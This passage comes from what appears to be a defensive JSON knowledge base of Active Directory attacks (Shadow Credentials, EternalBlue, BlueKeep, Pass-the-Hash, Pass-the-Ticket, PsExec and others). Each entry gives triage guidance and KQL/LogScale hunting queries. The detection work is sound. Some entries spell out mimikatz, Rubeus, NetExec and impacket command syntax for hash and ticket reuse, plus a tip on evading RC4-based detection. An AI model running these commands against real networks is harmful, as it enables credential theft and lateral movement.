alongside the noPac/Certifried family as a lateral-movement foothold.","tools":"impacket、Whisker、pyWhisker、custom LDAPスクリプト","detect":"Monitor for unexpected writes to the msDS-KeyCredentialLink attribute and changes to object security descriptors (nTSecurityDescriptor). Writes to privileged objects by low-privilege accounts are an indicator.","events":"5136(ディレクトリオブジェクト変更), 4662, 4768","mitigate":"Apply the November 2021 patch. Audit and minimize write ACLs on msDS-KeyCredentialLink, and enforce strong certificate mapping when using ADCS.","triage":"On the DC check 5136 for an unexpected write to a target computer/user's msDS-KeyCredentialLink, or an nTSecurityDescriptor change, together with 4662 (Write Property GUID), and verify the writing account legitimately administers that privileged object. Source host running Whisker/pyWhisker (Sysmon EID1) then a 5136 write to msDS-KeyCredentialLink then a certificate-based PKINIT TGT request 4768 under the same low-priv account is black. Legitimate Windows Hello for Business/device enrollment (the owning account registering its own KeyCredential, with no MDI alert) is white.","hunt":[{"plat":"Sentinel","t":"Low-priv write to msDS-KeyCredentialLink (5136) = Shadow Credentials privesc black / legit WHfB/device-registration write = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"msDS-KeyCredentialLink\"\n| where OperationType == \"%%14674\"  // value added\n| where SubjectUserName !endswith \"$\"\n| project TimeGenerated, DC=Computer, Actor=SubjectUserName, Target=ObjectName, Properties\n| summarize writes=count(), targets=dcount(Target) by Actor\n| where targets >= 1"},{"plat":"Sentinel","t":"Non-machine account rewrites nTSecurityDescriptor on a privileged object (5136) = SD-rewrite privesc black / legit ACL change by DA/delegated admin = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"nTSecurityDescriptor\"\n| where SubjectUserName !endswith \"$\"\n| summarize changes=count(), objs=make_set(ObjectName,8) by Actor=SubjectUserName, DC=Computer\n| where changes > 0"}],"huntcs":[{"plat":"LogScale","t":"Detects KeyCredentialLink (shadow credential) tooling on the endpoint; low-priv write=bad.","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(Whisker|pywhisker|Set-ADKeyCredentialLink|msDS-KeyCredentialLink|certipy\\s+shadow|ShadowCred|DSInternals)/i\n| groupBy([ComputerName, UserName, FileName, CommandLine])"},{"plat":"Identity Protection","t":"Directory object SD change (5136) is DC-only; defer to Identity Protection.","q":"// Falcon Identity Protection detection: unexpected msDS-KeyCredentialLink / nTSecurityDescriptor write to a privileged object by a low-priv principal (CVE-2021-42291)"}]},{"name":"SMBGhost","aka":"CoronaBlue, SMBv3 Compression Overflow","phase":"privesc","group":"Critical CVEs","mitre":"T1210, T1068","cve":"CVE-2020-0796","sev":"Critical","summary":"Exploits an integer overflow in SMBv3.1.1 compression handling to achieve remote code execution / privilege escalation.","how":"Exploits an integer overflow in SMBv3.1.1's SMB2_COMPRESSION_TRANSFORM_HEADER handling. A malformed message with the compression flag set corrupts the target's kernel memory, achieving pre-auth RCE or local SYSTEM escalation. Requires 445/TCP reachability and is wormable. In AD environments it is used for initial intrusion and lateral movement to DCs and file servers.","tools":"SMBGhost PoC(chompie1337 等)、Metasploit(cve_2020_0796)、danigargu exploit","detect":"Detect anomalous packets containing SMB2 compression headers or abnormal traffic to port 445 via IDS/IPS. lsass/kernel crashes, blue screens, and EDR memory-corruption detections are indicators.","events":"ネットワークIDSシグネチャ, System(クラッシュ/Bugcheck 1001), EDRテレメトリ","mitigate":"Apply the March 2020 patch. As an interim measure, set the DisableCompression registry value to 1 to disable SMB compression. Block 445/TCP at the perimeter and between hosts to reduce SMBv3.1.1 exposure.","triage":"Have IDS/IPS flag anomalous 445-bound packets carrying SMB2_COMPRESSION_TRANSFORM_HEADER, then check whether the target DC/file server's System log shows Bugcheck 1001 or lsass/kernel crash and EDR kernel-memory-corruption/exploit detection correlate to the same source IP and time. A single source, malformed compressed SMB to the target, a crash or a SYSTEM-elevated process, then lateral movement (4624 LogonType3 or follow-on C2) chained together is black. Legitimate SMB compression (bulk file transfer between patched hosts with well-formed headers, no crash or anomalous child process) is white.","hunt":[{"plat":"MDE","t":"One process/host makes many short-window 445 connections to many targets = SMBGhost scanning/spread black / steady SMB to file/backup servers = white","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where RemotePort == 445 and ActionType == \"ConnectionSuccess\"\n| summarize targets=dcount(RemoteIP), conns=count(), span=max(Timestamp)-min(Timestamp) by DeviceName, InitiatingProcessFileName\n| where targets > 20 and span < 30m"},{"plat":"MDE","t":"Execution artifacts of SMBGhost/CVE-2020-0796 PoC = black / none = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"CVE-2020-0796\",\"SMBGhost\",\"smbghost\",\"coronablue\") or FileName has_any (\"smbghost.exe\",\"ghost.py\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName"}],"huntcs":[{"plat":"Event Search","t":"Surfaces SMBGhost PoC execution on the host; SMB compression packet inspection itself is IDS not EDR.","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*cve-2020-0796*\" OR CommandLine=\"*SMBGhost*\" OR CommandLine=\"*CoronaBlue*\" OR FileName=\"SMBGhost.exe\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine"},{"plat":"LogScale","t":"One process fanning out to many hosts on 445 hints at remote SMBv3 exploitation.","q":"#event_simpleName=NetworkConnectIP4\n| RemotePort=445\n| groupBy([aid, ComputerName, ContextBaseFileName], function=count(RemoteAddressIP4, distinct=true, as=targets))\n| targets > 20"}]},{"name":"Kerberos Bronze Bit","aka":"S4U2self constrained delegation bypass","phase":"privesc","group":"Critical CVEs","mitre":"T1558, T1550.003","cve":"CVE-2020-17049","sev":"High","summary":"Tampers with the ciphertext of a service ticket to bypass the forwardable flag and Protected Users restrictions and abuse constrained delegation.","how":"An attacker holding the hash of a service account with constrained delegation nullifies the flags (forwardable) of an S4U2self-issued ticket and the 'account is sensitive and cannot be delegated'/Protected Users restrictions via ciphertext tampering, accessing downstream services as the target user. Requires the service account's credentials.","tools":"Rubeus(s4u /force-forwardable)、impacket getST.py","detect":"Monitor for abnormal S4U2self/S4U2proxy chains and delegated access against accounts that should not be delegable. Impersonation of many targets from a single service is an indicator.","events":"4769, 4768, 4624","mitigate":"Apply the November 2020 patch and the 2021 enforcement mode. Place privileged accounts in the Protected Users group and set the 'Account is sensitive and cannot be delegated' flag on sensitive accounts. Minimize constrained delegation configuration.","triage":"On the DC check 4769 for a single constrained-delegation service account producing an S4U2self then S4U2proxy chain, and whether delegation tickets are issued for a target that should be non-delegatable or in Protected Users. The same service account impersonating many privileged users to downstream services in a short window (a burst of 4769 plus target-side 4624 LogonType3) correlated with Rubeus/getST.py traces (Sysmon EID1) is black. A legitimate constrained-delegation app (operating within its configured user/service scope, not targeting Protected Users or non-delegatable accounts, during business hours) is white.","hunt":[{"plat":"Sentinel","t":"One service account issues RC4 (0x17) S4U TGS impersonating many distinct users (4769) = Bronze Bit delegation bypass black / single service's normal delegation = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769\n| where TicketEncryptionType == \"0x17\"\n| where TargetUserName !endswith \"$\"\n| summarize impersonated=dcount(TargetUserName), svcs=make_set(ServiceName,10), tickets=count() by Requestor=SubjectUserName, IpAddress\n| where impersonated > 10"}],"huntcs":[{"plat":"LogScale","t":"Detects Rubeus s4u / impacket getST S4U-chain tooling used for the Bronze Bit bypass.","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/Rubeus.*(s4u|bronzebit)|getST\\.py.*-impersonate|impacket.*getST/i\n| groupBy([ComputerName, UserName, FileName, CommandLine])"},{"plat":"Identity Protection","t":"S4U2self/proxy etype-downgrade anomaly (4769) is DC-only; defer to Identity Protection.","q":"// Falcon Identity Protection detection: Kerberos Bronze Bit / anomalous S4U delegation to a non-delegatable target (CVE-2020-17049)"}]},{"name":"Kerberos RC4-MD4 Session Key Recovery","aka":"AS-REP without-preauth attack","phase":"privesc","group":"Critical CVEs","mitre":"T1558.004, T1110","cve":"CVE-2022-33679","sev":"Medium","summary":"Recovers the session key from a weak RC4-MD4 AS response for an account with pre-authentication disabled and steals the TGT.","how":"Targets accounts with Kerberos pre-authentication disabled, forcing an AS-REP containing known plaintext under RC4-MD4, and recovers the session key online by exploiting the stream cipher's weakness. This yields a TGT for impersonation. Succeeds even without credentials as long as a DoNotRequirePreauth account exists.","tools":"Project Zero PoC(rc4_md4)、Rubeus/impacket(補助)","detect":"Monitor AS-REQ/AS-REP using RC4 (etype 23/-133, etc.), especially numerous requests against pre-auth-disabled accounts. Use of legacy cipher suites is itself an indicator.","events":"4768(暗号化タイプRC4), 4771, 4625","mitigate":"Apply the September 2022 (9/13 Patch Tuesday) patch (default AES enforcement is in the 2022/11/8 and later updates). Require Kerberos pre-authentication on all accounts and eliminate the DoNotRequirePreauth setting. Disable RC4 and migrate to AES-only.","triage":"On the DC check 4768 for repeated AS-REQ/AS-REP using RC4 (etype 23, or -133/-128 family) against a pre-auth-disabled (DoNotRequirePreauth) account from a single source in high volume, alongside 4771/4625 anomalies. A short-window flood of RC4 AS requests from one account/source IP, then follow-on 4769/4624 with the obtained TGT, chains to black. A legitimate legacy client/app (RC4-preferring but with pre-auth enabled and normal request rate, a known asset) leans white; AES-dominant (0x12) with pre-auth enabled fails the attack's premise and is white.","hunt":[{"plat":"Sentinel","t":"Burst of RC4 (0x17) AS-REQ (4768) to a preauth-disabled account from one IP = CVE-2022-33679 session-key recovery black / a single RC4 request = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4768\n| where TicketEncryptionType == \"0x17\"\n| summarize reqs=count() by TargetUserName, IpAddress, bin(TimeGenerated, 10m)\n| where reqs > 20\n| summarize bursts=count(), peak=max(reqs) by TargetUserName, IpAddress"},{"plat":"Sentinel","t":"Spike of Kerberos pre-auth failures (4771) for same account/IP = RC4-MD4 brute-force black / occasional password typo = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4771\n| summarize fails=count() by TargetUserName, IpAddress, bin(TimeGenerated, 10m)\n| where fails > 30"}],"huntcs":[{"plat":"LogScale","t":"Surfaces CVE-2022-33679 / AS-REP RC4 session-key recovery tooling on the endpoint.","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/CVE-2022-33679|33679|Rubeus.*asreproast|no.?preauth|DONT_REQ_PREAUTH/i\n| groupBy([ComputerName, UserName, FileName, CommandLine])"},{"plat":"Identity Protection","t":"Bulk RC4 AS-REQ against preauth-disabled accounts is DC-side 4768; defer to Identity Protection.","q":"// Falcon Identity Protection detection: RC4/MD4 downgrade AS-REQ against preauth-disabled accounts (CVE-2022-33679)"}]},{"name":"EternalBlue","aka":"MS17-010, WannaCry/NotPetya propagation","phase":"privesc","group":"Critical CVEs","mitre":"T1210, T1570","cve":"CVE-2017-0144","sev":"Critical","summary":"A pre-auth RCE exploiting an SMBv1 buffer-handling flaw, heavily used for lateral movement and worm propagation within AD environments.","how":"Exploits a transaction-handling flaw in SMBv1, sending a crafted packet to 445/TCP to corrupt kernel memory and achieve pre-auth RCE. After planting the DoublePulsar implant, it auto-propagates to other hosts in the domain, serving as a foundation for ransomware/lateral movement. Requires SMBv1-enabled hosts.","tools":"Metasploit(ms17_010_eternalblue)、Fuzzbunch/DoublePulsar、AutoBlue","detect":"Monitor SMBv1 traffic, abnormal scans/connections to port 445, and DoublePulsar's SMB echo responses. A rapid surge in 445 connections between hosts signals worming.","events":"System(SMBv1使用ログ), ネットワークIDSシグネチャ, 5140/5145","mitigate":"Apply MS17-010 (March 2017). Fully disable SMBv1 and block 445/135-139 at the perimeter and between segments. Suppress lateral movement with network segmentation.","triage":"Have network IDS detect SMBv1 transaction anomalies and DoublePulsar's SMB echo (Multiplex ID response), then correlate the target's System log SMBv1 use/crash with 5140/5145 (IPC$/ADMIN$ access, RelativeTargetName). A single source, malformed 445 packets, a target crash or SYSTEM implant, then rapidly proliferating 445 connections between hosts (worm spread) with follow-on lateral 4624 LogonType3, chains to black. Legitimate SMBv1 legacy traffic (limited connections to an old NAS/MFP over a known path, no exploit signature or connection surge) is white.","hunt":[{"plat":"MDE","t":"One host rapidly connecting to many hosts on 445 = EternalBlue/WannaCry worm propagation black / admin host's steady SMB = white","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where RemotePort == 445 and ActionType == \"ConnectionSuccess\"\n| summarize distinctTargets=dcount(RemoteIP), conns=count(), span=max(Timestamp)-min(Timestamp) by DeviceName, InitiatingProcessFileName\n| where distinctTargets > 30 and span < 1h"},{"plat":"Sentinel","t":"Many IPC$ accesses to srvsvc/browser named pipes (5145) = EternalBlue exploitation black / normal RPC/share usage = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5145\n| where ShareName has \"IPC$\"\n| where RelativeTargetName has_any (\"srvsvc\",\"browser\",\"spoolss\",\"samr\")\n| summarize accesses=count(), pipes=make_set(RelativeTargetName,8) by Computer, IpAddress, SubjectUserName\n| where accesses > 20"}],"huntcs":[{"plat":"Event Search","t":"Single host fanning out to many peers on 445 in a short window = worm-style EternalBlue spread.","q":"event_simpleName=NetworkConnectIP4 RemotePort=445\n| stats dc(RemoteAddressIP4) as targets by aid, ComputerName, ContextBaseFileName\n| where targets > 25\n| sort - targets"}]},{"name":"BlueKeep","aka":"RDP Pre-Auth RCE","phase":"privesc","group":"Critical CVEs","mitre":"T1210, T1021.001","cve":"CVE-2019-0708","sev":"Critical","summary":"A pre-auth RCE exploiting a use-after-free flaw in RDP (Terminal Services), used for initial intrusion into AD endpoints/servers.","how":"Exploits a Use-After-Free flaw in the RDP virtual channel MS_T120, sending a crafted channel request to 3389/TCP to execute code in kernel space. Pre-auth and wormable, targeting legacy OSes (Win7/2008) without NLA enabled. After intrusion it becomes a foothold for AD lateral movement.","tools":"Metasploit(cve_2019_0708_bluekeep_rce)、各種PoC","detect":"Monitor for abnormal connections to port 3389, use of the MS_T120 channel, and RDP service crashes/restarts. Scanning of externally exposed RDP is a precursor.","events":"System(TermDD/RDPクラッシュ), 4625, ネットワークIDS","mitigate":"Apply the May 2019 patch. Enable NLA (Network Level Authentication) and place RDP behind a VPN/jump host. Eliminate unnecessary 3389 exposure and retire legacy OSes.","triage":"Have network IDS flag anomalous MS_T120 virtual-channel requests to 3389, then correlate the target's (NLA-disabled Win7/2008) System log TermDD/RDP service crash/restart by time. A single external/internal source, a 3389 scan, an anomalous MS_T120 channel, an RDP crash, then post-SYSTEM lateral movement (4624 or follow-on C2), chains to black. Legitimate RDP (authenticated connections to NLA-enabled hosts, admin/helpdesk on a known path with no MS_T120 anomaly or service crash) is white; presence of a normal pre-authenticated 4624 LogonType10 leans white.","hunt":[{"plat":"MDE","t":"One remote IP connecting to 3389 across many hosts = BlueKeep scan/exploit black / connections from a legit RDP gateway = white","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where RemotePort == 3389 and ActionType == \"ConnectionSuccess\"\n| summarize targets=dcount(DeviceName), conns=count() by RemoteIP, InitiatingProcessFileName\n| where targets > 10"},{"plat":"Sentinel","t":"Cluster of RDP-related 4625 failures (LogonType 10) from external IPs on one host = BlueKeep probing precursor black / a few password typos = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4625 and LogonType == 10\n| summarize fails=count(), users=dcount(TargetUserName) by Computer, IpAddress, bin(TimeGenerated, 15m)\n| where fails > 15"}],"huntcs":[{"plat":"Event Search","t":"One host sweeping many peers on 3389 = RDP scan / BlueKeep precursor.","q":"event_simpleName=NetworkConnectIP4 RemotePort=3389\n| stats dc(RemoteAddressIP4) as targets by aid, ComputerName, ContextBaseFileName\n| where targets > 15\n| sort - targets"}]},{"name":"LocalPotato","aka":"NTLM Local EoP (SMB-to-self)","phase":"privesc","group":"Critical CVEs","mitre":"T1557.001, T1068","cve":"CVE-2023-21746","sev":"High","summary":"Reflects local NTLM authentication to SMB and abuses arbitrary file writes (etc.) to escalate to SYSTEM.","how":"Reflects locally occurring NTLM authentication to the same host's SMB server, and via cross-protocol abuse of the authentication challenge performs arbitrary file writes as a privileged process to escalate to SYSTEM. Requires local low-privilege execution rights, leading to privilege escalation and DLL hijacking on AD endpoints.","tools":"LocalPotato PoC、各種Potato系(RoguePotato/JuicyPotato亜種)","detect":"Monitor for local SMB loopback authentication and abnormal file writes by privileged processes via COM/RPC. Unexpected writes to system32 (etc.) are indicators.","events":"4624(ローカルNTLM), Sysmon 11(FileCreate), 4688","mitigate":"Apply the January 2023 patch. Enable SMB signing and detect NTLM reflection / arbitrary file-write behavior with EDR (LocalPotato is a local NTLM authentication-reflection file-write primitive, not a token-manipulation Potato). Enforce least privilege and application control.","triage":"On the target host check 4624 for local NTLM loopback authentication (LogonType3, source is the host itself), then correlate Sysmon EID11 (FileCreate) for an unexpected write to a protected path like System32 and 4688 for a low-priv process spawning a privileged one. Low-priv execution, an NTLM reflection auth to the local SMB, a SYSTEM-level System32 write (for DLL hijack), then an elevated process launch within one process tree, chains to black. A legitimate local service/installer (signed, writing to expected paths, with no NTLM reflection or loopback-auth anomaly) is white.","hunt":[{"plat":"Sentinel","t":"Non-machine account network logon (4624 LogonType 3) from loopback (127.0.0.1/::1) = LocalPotato SMB-to-self black / normal remote network logon = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4624 and LogonType == 3\n| where IpAddress in (\"127.0.0.1\",\"::1\")\n| where TargetUserName !endswith \"$\"\n| summarize logons=count() by Computer, TargetUserName, WorkstationName, IpAddress\n| where logons > 0"},{"plat":"MDE","t":"DLL/EXE writes into System32/SysWOW64 by a process other than SYSTEM/TrustedInstaller = LocalPotato arbitrary write black / legit patch writes = white","q":"DeviceFileEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"FileCreated\"\n| where FolderPath has_any (@\"\\Windows\\System32\\\", @\"\\Windows\\SysWOW64\\\")\n| where FileName endswith \".dll\" or FileName endswith \".exe\"\n| where InitiatingProcessAccountName !in~ (\"system\",\"trustedinstaller\")\n| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessAccountName"}],"huntcs":[{"plat":"Event Search","t":"Detects LocalPotato tooling on the host abusing SMB-to-self NTLM local EoP.","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*LocalPotato*\" OR FileName=\"LocalPotato.exe\" OR CommandLine=\"*cve-2023-21746*\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine"},{"plat":"Event Search","t":"Loopback (127.0.0.1) LogonType 3 authentication is the SMB-to-self local EoP tell.","q":"event_simpleName=UserLogon LogonType=3 RemoteAddressIP4=\"127.0.0.1\"\n| stats count by ComputerName, UserName, LogonType, RemoteAddressIP4, LogonServer"}]},{"name":"Pass-the-Hash (PtH)","aka":"NTLM hash reuse / pth-winexe","phase":"lateral","group":"Lateral Movement","mitre":"T1550.002","cve":"","sev":"Critical","summary":"Uses a captured NTLM hash in place of a plaintext password to complete NTLM authentication and authenticate to other hosts.","how":"Obtain NT hashes from mimikatz (sekurlsa::logonpasswords / sekurlsa::pth), LSASS dumps, DCSync, or SAM dumps. Requires a local/domain-admin-equivalent hash and reachability to SMB (445), etc. Generate an impersonation token with mimikatz sekurlsa::pth /user /domain /ntlm:<hash> /run:cmd, then move laterally via impacket's -hashes option or NetExec (nxc smb <ip> -u user -H <hash>). Reuse of the local Administrator hash is a typical abuse path.","tools":"mimikatz, impacket(psexec/wmiexec -hashes), NetExec, Metasploit psexec, pth-toolkit","detect":"Monitor logon event 4624 with LogonType=3 and AuthenticationPackage=NTLM, LmPackageName='NTLM V1/V2', appearing for admin accounts across many hosts. Detect short-window NTLM authentication from a single workstation name to multiple servers, and abnormal access to LSASS (Sysmon EventID 10, target lsass.exe).","events":"4624(LogonType 3/9), 4776, Sysmon 10(lsass access), 4672","mitigate":"Make local admin passwords unique with LAPS to eliminate hash reuse. Protect lsass credentials with Credential Guard, and adopt Protected Users group / management tier separation, SMB signing, Restricted Admin / Remote Credential Guard. Prohibit interactive logon of domain admins to member servers.","triage":"On target servers check 4624 for LogonType=3 with AuthenticationPackage=NTLM and LmPackageName='NTLM V1/V2' under one admin account hitting multiple hosts in a short window from the same WorkstationName (a fixed or naming-convention-violating source), alongside 4776. Source-host Sysmon EID10 showing anomalous lsass.exe access (mimikatz sekurlsa-style, GrantedAccess 0x1010/0x1410) then 4624 NTLM plus 4672 across multiple targets chains to black. Legitimate NTLM (monitoring/asset-management/backup service accounts reaching their expected host set at regular intervals over a known path that explains the lack of Kerberos and any lsass access) is white.","hunt":[{"plat":"MDE","t":"One account's successful NTLM network logons fan out to many hosts quickly = Pass-the-Hash lateral movement black / normal NTLM access to a single server = white","q":"DeviceLogonEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"LogonSuccess\" and LogonType == \"Network\"\n| where Protocol == \"NTLM\"\n| summarize hosts=dcount(DeviceName), logons=count(), span=max(Timestamp)-min(Timestamp) by AccountName, RemoteIP, RemoteDeviceName\n| where hosts > 5 and span < 1h"},{"plat":"MDE","t":"OpenProcessApiCall handle-open against lsass.exe by a non-security process = credential theft (PtH precursor) black / legit access by EDR/AV = white","q":"DeviceEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"OpenProcessApiCall\"\n| where FileName == \"lsass.exe\"\n| where InitiatingProcessFileName !in~ (\"MsMpEng.exe\",\"MsSense.exe\",\"csrss.exe\",\"wininit.exe\")\n| summarize count() by DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine"}],"huntcs":[{"plat":"Event Search","t":"One source/account authenticating LogonType 3 to many hosts fast = PtH lateral spread.","q":"event_simpleName=UserLogon LogonType=3\n| stats dc(aid) as targets by UserName, RemoteAddressIP4\n| where targets > 8\n| sort - targets"},{"plat":"LogScale","t":"Surfaces sekurlsa::pth / pth-* hash-reuse tooling on the source host.","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/sekurlsa::pth|pth-winexe|pth-wmis|Invoke-TheHash|-Hash\\s+[0-9a-fA-F]{32}/i\n| groupBy([ComputerName, UserName, FileName, CommandLine])"}]},{"name":"Pass-the-Ticket (PtT)","aka":"Kerberos ticket injection / Golden/Silver Ticket abuse","phase":"lateral","group":"Lateral Movement","mitre":"T1550.003","cve":"","sev":"Critical","summary":"Inject stolen or forged Kerberos TGT/TGS tickets into memory to authenticate to resources without a password or hash.","how":"Extract TGT/TGS from memory (.kirbi/ccache) via mimikatz sekurlsa::tickets /export or Rubeus dump/triage/monitor; requires access to the ticket holder's session. Inject the ticket into the current session with Rubeus ptt /ticket:<file> or mimikatz kerberos::ptt, then access SMB/WinRM/etc. Golden Tickets (forged with the krbtgt hash) and Silver Tickets (forged for a specific SPN with a service account hash) are injected as forms of PtT. On impacket/Linux, use the KRB5CCNAME environment variable to load the ccache.","tools":"Rubeus(dump/ptt), mimikatz(sekurlsa::tickets, kerberos::ptt), impacket(getST, -k -no-pass), ticketer.py","detect":"Anomalies in TGT/TGS requests (4768/4769): ticket encryption type RC4 (0x17) in an AES environment, account/host name mismatch, use of an existing TGT outside its validity period. Golden Tickets carry nonexistent accounts or abnormal lifetimes (10 years). Monitor endpoints for Rubeus/mimikatz execution artifacts.","events":"4768, 4769, 4770, 4624(LogonType 3), 4672","mitigate":"Periodically reset the krbtgt password (twice in succession) to invalidate Golden Tickets. Enforce AES encryption and disable RC4; shorten ticket lifetimes. Use the Protected Users group to block ticket delegation/RC4. Minimize exposure of privileged accounts on member servers.","triage":"On the source host check Sysmon EID1/10 for rubeus.exe/mimikatz or LSASS access (GrantedAccess 0x1010) to lsass.exe, then on the DC inspect 4768/4769 for Ticket Encryption Type 0x17(RC4) in an AES(0x12) environment, non-existent account names, abnormal lifetimes (4770/Golden Ticket ~10 years), or account/client-hostname mismatch. It is a true positive when these chain to the target's 4624 LogonType3 plus 4672 for the same account at the same time. A lone 4769, a known legacy service account that still negotiates RC4, or AES-based normal host-to-host Kerberos (file share/mgmt tools) in business hours leans benign.","hunt":[{"plat":"Sentinel","t":"TGS (4769) issued for an account that never got a TGT (4768) = Golden Ticket / Pass-the-Ticket black / normal service access backed by a real TGT = white","q":"let seenTgt = SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4768\n| distinct Account=TargetUserName;\nSecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769\n| where TargetUserName !endswith \"$\"\n| where TargetUserName !in (seenTgt)\n| summarize tgs=count(), svcs=make_set(ServiceName,8) by TargetUserName, IpAddress\n| where tgs > 0"},{"plat":"Sentinel","t":"RC4 (0x17) TGS requests (4769) concentrated on specific accounts in an AES environment = forged/injected ticket use black / legacy service legitimately requiring RC4 = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769\n| where TicketEncryptionType == \"0x17\"\n| where TargetUserName !endswith \"$\"\n| summarize rc4tgs=count(), svcs=dcount(ServiceName) by TargetUserName, IpAddress\n| where rc4tgs > 5"}],"huntcs":[{"plat":"LogScale","t":"Detects Rubeus ptt / mimikatz kerberos::ptt / .kirbi ticket-injection tooling on the host.","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/Rubeus.*(ptt|\\/ticket)|kerberos::ptt|mimikatz.*ptt|\\.kirbi|\\.ccache/i\n| groupBy([ComputerName, UserName, FileName, CommandLine])"},{"plat":"Identity Protection","t":"Golden/Silver ticket anomalies (etype/lifetime, nonexistent account) are DC-side; defer to Identity Protection.","q":"// Falcon Identity Protection detection: Pass-the-Ticket / Golden Ticket (anomalous ticket lifetime, RC4 in AES env, unknown principal)"}]},{"name":"Overpass-the-Hash / Pass-the-Key","aka":"PtK / TGT acquisition from an NTLM hash","phase":"lateral","group":"Lateral Movement","mitre":"T1550.002","cve":"","sev":"Critical","summary":"Use an NTLM hash or AES key to perform a Kerberos AS-REQ and obtain a legitimate TGT, then move laterally via Kerberos (bridging PtH and PtT).","how":"Obtain an NTLM hash or AES128/256 key via LSASS dump etc. (prerequisite). Request and inject a TGT with mimikatz sekurlsa::pth /user /domain /ntlm:<hash> /run:powershell, or Rubeus asktgt /user:<u> /rc4:<hash> (preferred: /aes256:<key>). Using an AES key instead of RC4 avoids the anomalous RC4 artifact in events. Use the acquired TGT to Kerberos-authenticate to SMB/WMI/WinRM. In impacket use getTGT.py -hashes / -aesKey.","tools":"Rubeus(asktgt), mimikatz(sekurlsa::pth), impacket getTGT.py","detect":"A 4768 where a TGT is issued from the same host using only a hash, an RC4-encrypted AS-REQ occurring in an otherwise AES environment, or a pattern where a Kerberos ticket suddenly appears without a preceding NTLM logon. Detect by correlating with LSASS access.","events":"4768(暗号化タイプ0x17/0x12), 4769, 4624","mitigate":"Allow AES encryption only and disable RC4 to surface PtK artifacts. Protect keys with Credential Guard; use LAPS and Tier separation. Rotate account credentials regularly.","triage":"On the source host confirm mimikatz sekurlsa::pth or Rubeus asktgt execution and lsass.exe access via Sysmon EID1/10, then on the DC check 4768 for a TGT suddenly issued from that host without a preceding NTLM logon, or an AS-REQ with Ticket Encryption Type 0x17(RC4) in an AES environment. LSASS dump then TGT issuance then 4624/4769 to the target for the same account in a short window is a true positive. A normal client that routinely requests AS-REQ over Kerberos, AES(0x12) admin activity from a PAW, or expected service-account behavior leans benign.","hunt":[{"plat":"Sentinel","t":"RC4 (0x17) TGT request (4768) from a single host/account in an AES environment = Overpass-the-Hash/Pass-the-Key black / legacy client's legit RC4 = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4768\n| where TicketEncryptionType == \"0x17\"\n| where TargetUserName !endswith \"$\"\n| summarize tgts=count(), ips=dcount(IpAddress) by TargetUserName, IpAddress, bin(TimeGenerated, 1h)\n| where tgts > 3"},{"plat":"MDE","t":"Handle-open against lsass.exe (OpenProcessApiCall) by a non-security process, enabling ticket forging = OtH credential extraction black / legit access by security products = white","q":"DeviceEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"OpenProcessApiCall\"\n| where FileName == \"lsass.exe\"\n| where InitiatingProcessFileName !in~ (\"MsMpEng.exe\",\"MsSense.exe\",\"wininit.exe\",\"csrss.exe\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName"}],"huntcs":[{"plat":"LogScale","t":"Surfaces Rubeus asktgt /rc4|/aes and sekurlsa::ekeys Overpass-the-Hash tooling.","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/Rubeus.*asktgt.*(\\/rc4|\\/ntlm|\\/aes256|\\/aes128)|sekurlsa::ekeys|kerberos::hash/i\n| groupBy([ComputerName, UserName, FileName, CommandLine])"},{"plat":"Identity Protection","t":"TGT appearing without preceding NTLM logon (4768 etype anomaly) is DC-correlated; defer to Identity Protection.","q":"// Falcon Identity Protection detection: Overpass-the-Hash / Pass-the-Key (RC4 0x17/AES 0x12 TGT with no matching interactive/NTLM logon)"}]},{"name":"PsExec (service exec over SMB)","aka":"Sysinternals PsExec / impacket psexec.py","phase":"lateral","group":"Lateral Movement","mitre":"T1570, T1021.002, T1569.002","cve":"","sev":"High","summary":"Drop a service binary to the ADMIN$ share over SMB (445) and start it as a service via the SCM for remote code execution.","how":"Requires local admin rights on the target and SMB reachability. Sysinternals PsExec \\\\target -s cmd or impacket psexec.py domain/user:pass@target copies an executable (e.g. PSEXESVC.exe/random name) to ADMIN$, creates and starts a service via svcctl RPC, and relays I/O over a named pipe. Supports PtH (-hashes). NetExec --exec-method smbexec (or atexec/mmcexec) can also execute (no psexec method exists).","tools":"PsExec(Sysinternals), impacket psexec.py, NetExec (--exec-method smbexec/atexec/mmcexec), Metasploit psexec_psh","detect":"Service install 7045 (random/PSEXESVC service name, ImagePath a temp file in ADMIN$), 4697, writes to ADMIN$ (5145 share access, RelativeTargetName), service start following 4624 